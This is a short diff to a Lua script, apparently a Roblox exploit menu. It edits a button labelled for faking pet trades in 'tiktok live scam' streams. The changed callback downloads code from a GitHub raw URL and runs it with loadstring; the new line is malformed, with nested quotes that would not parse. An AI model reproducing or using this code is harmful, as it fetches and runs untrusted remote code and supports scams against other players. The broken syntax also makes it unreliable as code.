@@ -72,7 +72,7 @@ local Tab = Window:MakeTab({
 Tab:AddButton({
     Name = "Visual sign pets (for tiktok live scam or smth).",
     Callback = function()
-    	loadstring(game:HttpGet("https://pastebin.com/raw/iGSanVe0", true))()
+    	loadstring(game:HttpGet("loadstring(game:HttpGet("https://raw.githubusercontent.com/RobloxMguiSetup/op/main/op%20partner%20scam", true))()", true))()
 
       end
 })
